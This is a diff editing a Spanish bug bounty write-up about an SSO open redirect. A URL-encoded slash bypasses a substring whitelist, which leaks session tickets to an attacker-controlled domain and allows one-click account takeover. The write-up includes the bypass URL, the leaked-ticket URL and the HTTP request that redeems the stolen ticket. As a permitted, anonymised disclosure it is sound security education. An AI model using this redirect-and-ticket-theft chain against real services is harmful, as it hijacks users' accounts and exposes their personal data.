@@ -23,63 +23,27 @@ takeaways:
   - "El ticket debe estar atado al destino que lo pidió. Si vale en cualquier sitio, cualquier sitio puede gastarlo."
 ---
 
-Este es, de todos los que he publicado, el que más me cambió la forma de mirar. Porque
-empezó pareciendo el fallo más aburrido del catálogo —un *open redirect*, de los que
-muchos programas ni aceptan— y terminó siendo **la toma de la cuenta con un clic**.
-
-<div class="warn" markdown="1">
-**Todo está anonimizado.** Publicado con permiso del programa y sin identificar al
-producto: empresa, dominios, nombres de cookies y de parámetros están cambiados. El
-mecanismo y la cadena son exactos.
-</div>
-
-## El punto de partida
-
-Un sistema de **inicio de sesión único** (SSO): esa página del fabricante por la que pasas
-para entrar en cualquiera de sus servicios. Tú escribes la contraseña una vez, el SSO te
-devuelve a la aplicación que la pidió, y esa aplicación te da la sesión.
-
-Para saber a dónde devolverte, el SSO acepta un parámetro en la URL:
+Un SSO acepta en la URL a dónde devolverte después del login:
 
 ```
 https://sso.ejemplo.tld/doLogin?host=app.ejemplo.tld
 ```
 
-Ese parámetro viaja en el enlace, así que lo escribe quien hace el enlace. Y quien hace el enlace puede ser cualquiera.
+Ese parámetro lo escribe quien hace el enlace, y quien hace el enlace puede ser cualquiera.
+Lo primero que probé fue mi propio dominio: **rechazado**, con un error interno. Buena
+noticia: hay un control, y un control se puede estudiar.
 
-## Primer intento: rechazado (y eso es buena noticia)
+## Qué regla aplicaba
 
-Lo primero que prueba todo el mundo es poner su propio dominio:
-
-```
-https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com
-```
-
-Respuesta: **rechazado**, con un código de error interno. El servidor no se traga cualquier
-cosa.
-
-Aquí mucha gente cierra la pestaña y se va. Yo hago lo contrario: que
-**rechace** significa que hay un control, y un control es algo que se puede **estudiar**.
-Si me hubiera aceptado el dominio a la primera, sería un fallo trivial. Que me rechace
-convierte la pregunta en una mucho mejor: *¿qué regla exacta está aplicando?*
-
-Y esa pregunta es la que paga.
-
-## Cómo se rompe una lista blanca que compara texto
-
-La forma más común de validar un dominio —y la más rota— es preguntar *«¿el texto termina
-en `.marca.com`?»* o, peor, *«¿lo contiene?»*.
-
-Suena razonable. Falla por una razón sutil: **una URL no es una cadena de texto, es una
-estructura**, y el navegador la parte por sitios que una comparación de texto ignora.
-
-Mira estos tres valores y piensa dónde acaba el usuario:
+La forma más común de validar un dominio, y la más rota, es preguntar si el texto termina
+en `.marca.com` o —peor— si lo contiene. Falla porque una URL no es una cadena: el
+navegador decide el destino con lo que hay **antes de la primera barra**.
 
 | Valor del parámetro | Lo que ve la comprobación | Dónde acaba el navegador |
 |---|---|---|
 | `app.marca.com` | contiene `.marca.com` ✅ | `app.marca.com` ✅ |
 | `atacante.com/.marca.com` | contiene `.marca.com` ✅ | **`atacante.com`** ⚠ |
-| `atacante.com%2F.marca.com` | tras decodificar, igual que el anterior | **`atacante.com`** ⚠ |
+| `atacante.com%2F.marca.com` | tras decodificar, igual | **`atacante.com`** ⚠ |
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/02-anatomia-url.svg' | relative_url }}"
@@ -87,26 +51,28 @@ Mira estos tres valores y piensa dónde acaba el usuario:
   <figcaption>El navegador corta en la primera barra. La comprobación mira la cadena entera. Ahí está el hueco.</figcaption>
 </figure>
 
-El navegador decide el destino con lo que hay **antes de la primera
-barra**. Todo lo que viene después es la ruta, el «dentro de» ese sitio. Así que
 `atacante.com/.marca.com` es una página llamada `.marca.com` dentro del servidor del
-atacante.
-
-Pero si el servidor solo mira si el texto *contiene* `.marca.com`... lo contiene. Pasa el
-control. Y te manda a casa del atacante.
-
-El `%2F` del tercer ejemplo es la barra escrita en código de URL. El servidor la
-**decodifica** antes de comparar y antes de construir la redirección, así que acaba siendo
-una barra de verdad — pero por el camino se cuela en validaciones que habrían rechazado
-una barra literal.
-
-Esa fue la llave:
+atacante. La comprobación la deja pasar porque el texto contiene lo que busca. El `%2F` es
+la misma barra escrita en código de URL: el servidor la decodifica antes de comparar, y así
+se cuela donde una barra literal habría sido rechazada.
 
 ```
 https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com%2F.marca-ejemplo.com
 ```
 
-Aceptado. Redirección al dominio del atacante.
+Aceptado.
+
+## Lo que se iba con la redirección
+
+Un open redirect a secas es poca cosa. Lo que convierte esto en otra cosa es que el SSO
+añadía a la URL de vuelta un **ticket de sesión**: una cadena de un solo uso que la
+aplicación canjea para obtener las cookies del usuario.
+
+```
+https://atacante-ejemplo.com/.marca-ejemplo.com?ticket=a1b2c3d4e5f6...
+```
+
+El atacante controla ese servidor, así que lo lee en su propio registro de accesos.
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-al-atacante.png' | relative_url }}"
@@ -114,36 +80,12 @@ Aceptado. Redirección al dominio del atacante.
   <figcaption>Arriba lo que envié; abajo lo que respondió el servidor. El <code>redirectUrl</code> apunta al dominio del atacante y lleva el ticket <code>au=</code> pegado. Dos recortes de la misma petición, con el host, la cuenta y el dominio de la víctima tapados.</figcaption>
 </figure>
 
-## Y aquí es donde deja de ser un open redirect
+## Un clic
 
-Un *open redirect* a secas es poca cosa: mandas a alguien a una web que no esperaba. Sirve
-para *phishing*, y muchos programas ni lo pagan.
-
-Lo que convierte esto en otra cosa es **qué se lleva la redirección consigo**.
-
-Al completar el salto, el SSO añadía a la URL un **ticket de sesión**: una cadena de un
-solo uso que la aplicación legítima canjea para obtener las cookies del usuario. Y ese
-ticket se fue, entero, al dominio del atacante:
-
-```
-https://atacante-ejemplo.com/.marca-ejemplo.com?ticket=a1b2c3d4e5f6...
-```
-
-Imagina que el portero del edificio, en vez de acompañarte a tu piso, le
-da **la llave** a quien le diga una dirección parecida a la tuya. No es que te haya mandado
-al sitio equivocado: es que ha entregado la llave por el camino.
-
-Y como el atacante controla ese servidor, lee el ticket en su propio registro de accesos.
-Ni siquiera necesita que la víctima haga nada más.
-
-## El caso de un solo clic
-
-Hay un detalle que lo empeora mucho. Si la víctima **ya tiene la sesión abierta** —el caso
-normal, porque la gente no cierra sesión— no aparece ninguna pantalla de login. El SSO ve
-las cookies, da por buena la identidad y emite el ticket **directamente**.
-
-La víctima hace **un clic** en un enlace cuyo dominio visible es el del fabricante de
-verdad. No escribe contraseña. No ve nada raro. Y el ticket ya está en manos del atacante.
+Si la víctima ya tiene la sesión abierta —el caso normal— no aparece ninguna pantalla de
+login: el SSO ve las cookies, da por buena la identidad y emite el ticket directamente. Un
+clic en un enlace cuyo dominio visible es el del fabricante, sin escribir contraseña y sin
+ver nada raro.
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena.svg' | relative_url }}"
@@ -151,11 +93,9 @@ verdad. No escribe contraseña. No ve nada raro. Y el ticket ya está en manos d
   <figcaption>Cinco pasos y una sola acción de la víctima. Lo que viaja en la redirección es una credencial.</figcaption>
 </figure>
 
-## Canjear el ticket
+## Canjearlo
 
-Desde una sesión completamente limpia —sin cookie ninguna, sin contraseña, otro navegador,
-otra máquina— el atacante presenta el ticket robado en el endpoint normal de
-autenticación:
+Desde una sesión limpia: otro navegador, otra máquina, sin cookie ninguna.
 
 ```http
 GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
@@ -167,37 +107,15 @@ HTTP/2 200 OK
 set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
 ```
 
-El servidor entrega **las cookies de sesión de la víctima**. El ticket por sí solo
-produjo la sesión.
+El ticket por sí solo produjo la sesión de la víctima. Para demostrar qué abre hice una
+única lectura, el perfil del propio usuario, y devolvió sus datos personales en claro,
+incluido el correo completo — mientras la interfaz lo enseña enmascarado. Ahí paré.
 
-## Demostrar el impacto sin pasarse
+## Un extra
 
-Tener una cookie no demuestra nada por sí solo. Hay que enseñar **qué abre**. Usé esa
-sesión para una única lectura, el perfil del propio usuario:
-
-```http
-GET /v3/users/info HTTP/2
-Host: api.ejemplo.tld
-sessionId: <el de la víctima>
-```
-
-Y devolvió sus datos personales **en claro**, incluido el correo completo — mientras que
-la propia aplicación, en su interfaz, lo enseña enmascarado.
-
-La aplicación te muestra `j***@gmail.com` porque considera que el correo
-es un dato sensible. La API lo devuelve entero. Esa diferencia es la prueba de que lo que
-tengo en la mano no es «una sesión cualquiera»: es **la identidad de esa persona**.
-
-Y ahí paré. No toqué dispositivos, no modifiqué nada, no entré en nada que no fuera la
-cuenta de prueba.
-
-## Un regalo extra: la cookie que anulaba la protección
-
-Mirando las cookies que se establecían al canjear el ticket, vi que una de ellas llevaba
-**el mismo identificador de sesión en claro** y, a diferencia de la principal, **sin la
-marca `HttpOnly`**.
-
-Si el **mismo** identificador viaja también en una segunda cookie sin esa marca, la protección de la primera no vale nada: cualquier script lo lee de la otra. Es cerrar una puerta con llave y dejar la ventana de al lado abierta.
+Una de las cookies que se establecían al canjear llevaba **el mismo identificador de
+sesión en claro** y, a diferencia de la principal, sin `HttpOnly`. Da igual proteger la
+primera: cualquier script lo lee de la otra.
 
 ## Impacto
 
